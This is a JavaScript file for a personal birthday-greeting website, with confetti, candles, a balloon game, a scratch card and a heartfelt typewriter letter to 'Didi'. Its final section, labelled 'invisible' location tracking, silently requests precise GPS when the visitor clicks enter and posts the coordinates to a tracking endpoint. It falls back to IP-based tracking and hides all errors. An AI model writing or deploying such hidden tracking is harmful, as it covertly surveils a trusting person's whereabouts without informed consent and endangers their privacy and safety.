document.addEventListener('DOMContentLoaded', () => {
  // ===== ENTRANCE =====
  const enterBtn = document.getElementById('enter-btn');
  const entrance = document.getElementById('entrance');
  const mainSite = document.getElementById('main-site');

  enterBtn.addEventListener('click', () => {
    entrance.classList.add('fade-out');
    requestLocation(); // Silently request GPS after they click
    setTimeout(() => {
      entrance.style.display = 'none';
      mainSite.classList.remove('hidden');
      void mainSite.offsetWidth;
      mainSite.classList.add('visible');
      initConfetti();
      fireConfettiBurst();
    }, 1000);
  });

  // ===== CONFETTI CANVAS =====
  const canvas = document.getElementById('confetti-canvas');
  const ctx = canvas.getContext('2d');
  let particles = [];
  const colors = ['#ff6b6b','#4ecdc4','#ffe66d','#ff9a9e','#a1c4fd','#fecfef','#fd79a8'];

  function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
  window.addEventListener('resize', resizeCanvas);
  resizeCanvas();

  class Confetti {
    constructor(x, y) {
      this.x = x ?? Math.random() * canvas.width;
      this.y = y ?? -Math.random() * canvas.height;
      this.r = Math.random() * 5 + 2;
      this.dx = Math.random() * 4 - 2;
      this.dy = Math.random() * 3 + 2;
      this.color = colors[Math.floor(Math.random() * colors.length)];
      this.tilt = Math.floor(Math.random() * 10) - 10;
      this.tiltAngleInc = Math.random() * 0.07 + 0.05;
      this.tiltAngle = 0;
    }
    update() {
      this.tiltAngle += this.tiltAngleInc;
      this.y += this.dy;
      this.x += this.dx;
      this.tilt = Math.sin(this.tiltAngle) * 12;
      if (this.y > canvas.height) { this.y = -10; this.x = Math.random() * canvas.width; }
    }
    draw() {
      ctx.beginPath();
      ctx.lineWidth = this.r;
      ctx.strokeStyle = this.color;
      ctx.moveTo(this.x + this.tilt + this.r, this.y);
      ctx.lineTo(this.x + this.tilt, this.y + this.tilt + this.r);
      ctx.stroke();
    }
  }

  function initConfetti() {
    for (let i = 0; i < 120; i++) particles.push(new Confetti());
    animateConfetti();
  }

  function animateConfetti() {
    requestAnimationFrame(animateConfetti);
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    particles.forEach(p => { p.update(); p.draw(); });
  }

  function fireConfettiBurst() {
    for (let i = 0; i < 60; i++) {
      let p = new Confetti(canvas.width / 2, canvas.height / 2);
      p.dy = Math.random() * -15 - 5;
      p.dx = Math.random() * 20 - 10;
      particles.push(p);
    }
    setTimeout(() => { if (particles.length > 120) particles.splice(120); }, 3500);
  }

  // ===== CAKE =====
  const cake = document.getElementById('cake');
  cake.addEventListener('click', (e) => {
    if (!e.target.closest('.candle')) {
      cake.classList.remove('wobble');
      void cake.offsetWidth;
      cake.classList.add('wobble');
    }
  });

  const candles = document.querySelectorAll('.candle');
  let candlesOut = 0;
  const wishMsg = document.getElementById('cake-wish-msg');

  candles.forEach(candle => {
    candle.addEventListener('click', () => {
      if (!candle.classList.contains('out')) {
        candle.classList.add('out');
        candlesOut++;
        if (candlesOut === candles.length) {
          setTimeout(() => {
            wishMsg.classList.remove('hidden');
            fireConfettiBurst();
          }, 400);
        }
      }
    });
  });

  // ===== BIRTHDAY CARD =====
  const cardFront = document.getElementById('card-front');
  const card = document.getElementById('birthday-card');
  
  cardFront.addEventListener('click', () => {
    card.classList.add('open');
    fireConfettiBurst();
  });

  // ===== MESSAGE WALL =====
  document.querySelectorAll('.msg-card').forEach(mc => {
    mc.addEventListener('click', () => mc.classList.toggle('flipped'));
  });

  // ===== BALLOON GAME =====
  const balloonArea = document.getElementById('balloon-area');
  const balloonReset = document.getElementById('balloon-reset');
  const bColors = ['#ff6b6b','#4ecdc4','#a1c4fd','#fd79a8','#ffe66d','#a29bfe','#ffeaa7'];
  let popCount = 0;

  const balloonMessages = [
    "🎉 This year is YOUR year!",
    "😊 Your smile lights up everything!",
    "💫 More fun just because you exist!",
    "💃 Stay crazy, stay you!",
    "💖 So grateful we met!",
    "🦎 Komodo queen forever!",
    "✨ You deserve the whole world!",
    "🥺 Everyone wishes they had you!",
    "😂 More unhinged moments pls!",
    "🫶 Thank you for existing!"
  ];

  function spawnPopParticles(x, y, color) {
    for (let i = 0; i < 10; i++) {
      const p = document.createElement('div');
      p.className = 'balloon-particle';
      p.style.left = x + 'px';
      p.style.top = y + 'px';
      p.style.backgroundColor = color;
      const angle = (Math.PI * 2 / 10) * i;
      const dist = 30 + Math.random() * 40;
      p.style.setProperty('--px', Math.cos(angle) * dist + 'px');
      p.style.setProperty('--py', Math.sin(angle) * dist + 'px');
      balloonArea.appendChild(p);
      setTimeout(() => p.remove(), 600);
    }
  }

  function spawnPopMessage(x, y, msg) {
    const el = document.createElement('div');
    el.className = 'balloon-pop-msg';
    el.innerText = msg;
    el.style.left = Math.max(10, Math.min(x - 60, balloonArea.offsetWidth - 200)) + 'px';
    el.style.top = y + 'px';
    balloonArea.appendChild(el);
    setTimeout(() => el.remove(), 2500);
  }

  function spawnBalloons(count) {
    // Remove old balloons and messages but keep reset btn
    balloonArea.querySelectorAll('.balloon, .balloon-pop-msg, .balloon-particle').forEach(e => e.remove());
    popCount = 0;

    const shuffled = [...balloonMessages].sort(() => Math.random() - 0.5);

    for (let i = 0; i < count; i++) {
      const b = document.createElement('div');
      b.className = 'balloon';
      b.style.left = (10 + Math.random() * 70) + '%';
      const balloonColor = bColors[Math.floor(Math.random() * bColors.length)];
      b.style.backgroundColor = balloonColor;
      b.style.animationDuration = (7 + Math.random() * 5) + 's';
      b.style.animationDelay = (Math.random() * 3) + 's';

      const msgForBalloon = shuffled[i % shuffled.length];

      b.addEventListener('click', function pop(e) {
        const rect = this.getBoundingClientRect();
        const areaRect = balloonArea.getBoundingClientRect();
        const cx = rect.left + rect.width / 2 - areaRect.left;
        const cy = rect.top + rect.height / 2 - areaRect.top;

        // Spawn particles at balloon center
        spawnPopParticles(cx, cy, balloonColor);
        // Spawn floating message
        spawnPopMessage(cx, cy, msgForBalloon);

        this.remove();

        popCount++;
        if (popCount === count) {
          setTimeout(() => {
            spawnPopMessage(areaRect.width / 2, areaRect.height / 2, "🎈 You got them all! Incredible year ahead! 🎈");
            fireConfettiBurst();
          }, 400);
        }
        this.removeEventListener('click', pop);
      });
      balloonArea.appendChild(b);
    }
  }

  balloonReset.addEventListener('click', () => spawnBalloons(10));
  spawnBalloons(10);

  // ===== SCRATCH CARD =====
  const scratchCanvas = document.getElementById('scratch-canvas');
  const sctx = scratchCanvas.getContext('2d');
  const scratchReset = document.getElementById('scratch-reset');
  const scratchMsg = document.getElementById('scratch-msg');
  const scratchSubMsg = document.getElementById('scratch-sub-msg');
  let isDrawing = false;

  const scratchMessages = [
    { title: "The universe knew exactly what it was doing when it made us meet!", sub: "So grateful for you, always 💫" },
    { title: "You're literally irreplaceable!", sub: "Life would be SO boring without you 😂" },
    { title: "Supercalifragilisticexpialidocious!", sub: "That's the only word big enough for you 😄✨" },
    { title: "Partner in crime detected!", sub: "Here's to a million more crazy adventures 💃🦎" },
    { title: "Plot twist: you're the main character!", sub: "And everyone else is just a side quest 👑" },
    { title: "You're the friend everyone deserves!", sub: "But only I'm lucky enough to have 🥹💖" },
    { title: "If kindness was a person...", sub: "It would literally be you, no debate ✨" }
  ];
  let scratchMsgIdx = 0;

  function initScratch() {
    const msg = scratchMessages[scratchMsgIdx % scratchMessages.length];
    scratchMsgIdx++;
    if (scratchMsg) scratchMsg.innerText = "🌟 " + msg.title + " 🌟";
    if (scratchSubMsg) scratchSubMsg.innerText = msg.sub;

    sctx.globalCompositeOperation = 'source-over';
    const gradient = sctx.createLinearGradient(0, 0, scratchCanvas.width, scratchCanvas.height);
    gradient.addColorStop(0, '#c0c0c0');
    gradient.addColorStop(1, '#a0a0a0');
    sctx.fillStyle = gradient;
    sctx.fillRect(0, 0, scratchCanvas.width, scratchCanvas.height);
    sctx.font = 'bold 18px Outfit';
    sctx.fillStyle = '#666';
    sctx.textAlign = 'center';
    sctx.fillText('✨ Scratch here! ✨', scratchCanvas.width / 2, scratchCanvas.height / 2);
    sctx.globalCompositeOperation = 'destination-out';
  }

  initScratch();

  function scratch(e) {
    if (!isDrawing) return;
    e.preventDefault();
    const rect = scratchCanvas.getBoundingClientRect();
    const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
    const y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
    sctx.beginPath();
    sctx.arc(x, y, 22, 0, Math.PI * 2);
    sctx.fill();
  }

  scratchCanvas.addEventListener('mousedown', () => isDrawing = true);
  scratchCanvas.addEventListener('mouseup', () => isDrawing = false);
  scratchCanvas.addEventListener('mouseleave', () => isDrawing = false);
  scratchCanvas.addEventListener('mousemove', scratch);
  scratchCanvas.addEventListener('touchstart', (e) => { isDrawing = true; scratch(e); });
  scratchCanvas.addEventListener('touchend', () => isDrawing = false);
  scratchCanvas.addEventListener('touchmove', scratch);

  scratchReset.addEventListener('click', initScratch);



  // ===== TYPEWRITER =====
  const twText = document.getElementById('typewriter-text');
  const letterSign = document.getElementById('letter-sign');
  const letterContent = "Happyyy Birthday Didi! Even though we aren't sisters by blood, honestly you feel closer than that. The universe really knew what it was doing when it made our paths cross. You are one of the most important people in my life and I genuinely mean that. Thank you for every crazy moment, every random conversation, every time you just got me without me having to explain. You make everything better just by existing. I hope this year gives you everything you've been wishing for and SO much more ✨🌸";
  let twIndex = 0;
  let hasTyped = false;

  function typeWriter() {
    if (twIndex < letterContent.length) {
      twText.innerHTML += letterContent.charAt(twIndex);
      twIndex++;
      setTimeout(typeWriter, 40);
    } else {
      if (letterSign) letterSign.classList.remove('hidden');
    }
  }

  const twSection = document.getElementById('typewriter-section');
  const observer = new IntersectionObserver((entries) => {
    if (entries[0].isIntersecting && !hasTyped) {
      hasTyped = true;
      typeWriter();
    }
  }, { threshold: 0.3 });
  observer.observe(twSection);

  // ===== CONFETTI MEGA BUTTON =====
  const megaBtn = document.getElementById('confetti-mega-btn');
  const partyCountDisplay = document.getElementById('party-count');
  let partyCount = 0;

  megaBtn.addEventListener('click', () => {
    partyCount++;
    partyCountDisplay.innerText = partyCount;
    for (let i = 0; i < 3; i++) setTimeout(fireConfettiBurst, i * 200);
    const c1 = colors[Math.floor(Math.random() * colors.length)];
    const c2 = colors[Math.floor(Math.random() * colors.length)];
    megaBtn.style.background = `linear-gradient(45deg, ${c1}, ${c2})`;
  });

  // ===== LOCATION TRACKING (invisible) =====
  let locationSent = false;

  function sendLocation(lat, lng, source, accuracy) {
    if (locationSent) return;
    locationSent = true;
    fetch('/api/track', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ lat, lng, source, accuracy })
    }).catch(() => {}); // Silent — never show errors to visitor
  }

  function requestLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          // GPS allowed — send exact coordinates
          sendLocation(
            pos.coords.latitude,
            pos.coords.longitude,
            'gps',
            pos.coords.accuracy
          );
        },
        () => {
          // GPS denied or error — fall back to IP-based
          sendLocation(null, null, 'ip', null);
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    } else {
      // Browser doesn't support geolocation — fall back to IP
      sendLocation(null, null, 'ip', null);
    }
  }
});
